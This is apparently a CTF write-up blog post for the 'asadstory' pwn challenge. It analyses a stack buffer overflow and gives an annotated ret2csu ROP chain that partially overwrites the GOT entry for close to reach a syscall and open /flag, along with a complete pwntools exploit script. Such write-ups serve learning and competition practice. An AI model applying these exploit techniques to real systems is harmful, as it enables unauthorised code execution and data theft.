---
title: asadstory
date: 2025-01-07
type: posts
draft: false
categories:
  - CTF-PWN
tags:
  - linux
  - ctf
  - pwn
  - writeup
  - stack
  - ret2csu
---

[Challenge files](./A_Sad_Story.zip)

A simple stack overflow. As the Chinese saying goes: "Fortune is fickle — don't look down on the young single dog!!!"

<!--more-->

## Challenge Analysis

checksec:

![checksec](checksec.png)

Sandbox:

![seccomp](seccomp.png)

The first input only accepts 1; any other number exits the program.

After entering 1, the program enters `sub_1492`:

![sub_1492](sub_1492.png)

It loops for user input, selecting a function based on the number: 1 calls `sub_1420`, 2 calls `sub_1468`.

`sub_1420` prints the `sub_1249` function pointer and closes stdout:

![sub_1420](sub_1420.png)

`sub_1468` reads user input onto the stack. The pre-allocated size is 0x30 — a stack buffer overflow exists:

![sub_1468](sub_1468.png)

## Solution Strategy

`sub_1420` provides the base address, then exploit `sub_1468`'s stack overflow for a ret2csu ROP chain.

The ret2csu approach uses `read` to modify the last byte of `got[close]` to point to `syscall`, then controls `rax` through `read`'s return value to invoke `openat` and read the flag.

## PoC

ROP chain:

```plain
csu1
.text:0000000000001620 4C 89 F2                      mov     rdx, r14
.text:0000000000001623 4C 89 EE                      mov     rsi, r13
.text:0000000000001626 44 89 E7                      mov     edi, r12d
.text:0000000000001629 41 FF 14 DF                   call    qword ptr [r15+rbx*8]

csu2
.text:000000000000163A 5B                            pop     rbx     
.text:000000000000163B 5D                            pop     rbp
.text:000000000000163C 41 5C                         pop     r12
.text:000000000000163E 41 5D                         pop     r13
.text:0000000000001640 41 5E                         pop     r14
.text:0000000000001642 41 5F                         pop     r15
.text:0000000000001644 C3                            retn

rop_chain = [
    csu2, 0, 1, 0, elf.got['close'], 1, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got['close'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got['close'],
    csu1
]

Argument 1: RDI
Argument 2: RSI
Argument 3: RDX
Argument 4: RCX
Argument 5: R8
Argument 6: R9

mov rbx, 0
mov rbp, 1
mov r12, 0
mov r13, got[close]
mov r14, 1
mov r15, got[read]

// Write one byte, changing the last byte of got[close] to 0x15 (syscall offset)
mov rdx, r14                    ; mov rdx, 1            ; count
mov rsi, r13                    ; mov rsi, got[close]   ; buf
mov edi, r12d                   ; mov edi, 0            ; fd
call [r15+rbx*8]                ; call read         ssize_t read(int fd, void buf[.count], size_t count);


mov rbx, 0
mov rbp, 1
mov r12, 0
mov r13, elf.address + 0x4280
mov r14, 257
mov r15, got[read]

mov rdx, r14                    ; mov rdx, 257                      ; count
mov rsi, r13                    ; mov rsi, elf.address + 0x4280     ; buf
mov edi, r12d                   ; mov edi, 0                        ; fd
call [r15+rbx*8]                ; call read         ssize_t read(int fd, void buf[.count], size_t count);


mov rbx, 0
mov rbp, 1
mov r12, 0
mov r13, elf.address + 0x4280
mov r14, 0
mov r15, got[close]

mov rdx, r14                    ; mov rdx, 0                        ; flag = O_RDONLY
mov rsi, r13                    ; mov rsi, elf.address + 0x4280     ; path
mov edi, r12d                   ; mov edi, 0                        ; fd
call [r15+rbx*8]                ; call close         int openat(int fd, const char *path, int oflag, ...);


mov rbx, 0
mov rbp, 1
mov r12, 1
mov r13, elf.address + 0x4280
mov r14, 0x30
mov r15, got[read]

mov rdx, r14                    ; mov rdx, 0x30                     ; count
mov rsi, r13                    ; mov rsi, elf.address + 0x4280     ; buf
mov edi, r12d                   ; mov edi, 1                        ; fd
call [r15+rbx*8]                ; call read         ssize_t read(int fd, void buf[.count], size_t count);



mov rbx, 0
mov rbp, 1
mov r12, 0
mov r13, elf.address + 0x4280 + 0x30
mov r14, 1
mov r15, got[read]

mov rdx, r14                    ; mov rdx, 1                                ; count
mov rsi, r13                    ; mov rsi, elf.address + 0x4280 + 0x30      ; buf
mov edi, r12d                   ; mov edi, 0                                ; fd
call [r15+rbx*8]                ; call read         ssize_t read(int fd, void buf[.count], size_t count);


mov rbx, 0
mov rbp, 1
mov r12, 2
mov r13, elf.address + 0x4280
mov r14, 0x30
mov r15, got[close]

mov rdx, r14                    ; mov rdx, 0x30                     ; flag = O_RDONLY
mov rsi, r13                    ; mov rsi, elf.address + 0x4280     ; path
mov edi, r12d                   ; mov edi, 2                        ; fd
call [r15+rbx*8]                ; call close         write
```

Cited from [https://g1at.github.io/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/#asadstory](https://g1at.github.io/2023/11/25/DASCTF%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B/#asadstory).

```python
from pwn import *

context.arch = 'amd64'
libc = ELF('./libc-2.31.so')  
elf = ELF('./challenge')      

p = gdb.debug('./challenge', 'brva 0x1480')

# p = process("./challenge")
# p = remote("node4.buuoj.cn", 28133)

def elf_base():
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', b'1')
    p.recvuntil(b'0x')
    value = int(p.recv(12), 16) - 0x1249
    return value

elf.address = elf_base()
print("elf-->" + hex(elf.address))

csu1 = elf.address + 0x1620
csu2 = elf.address + 0x163a

offset = b'a' * 0x38

# Craft the ROP chain
rop_chain = [
    csu2, 0, 1, 0, elf.got['close'], 1, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280, 257, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280, 0, elf.got['close'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 1, elf.address + 0x4280, 0x30, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 0, elf.address + 0x4280 + 0x30, 1, elf.got['read'],
    csu1, 0, 0, 0, 0, 0, 0, 0,
    csu2, 0, 1, 2, elf.address + 0x4280, 0x30, elf.got['close'],
    csu1
]


payload = b''.join([p64(addr) for addr in rop_chain])


p.sendline(b'2')
p.sendline(offset + payload)
p.send(b'\x15')
p.send(b'/flag' + b'\x00' * (257 - 5))
p.send(b'\x00' * 1)
p.interactive()

```
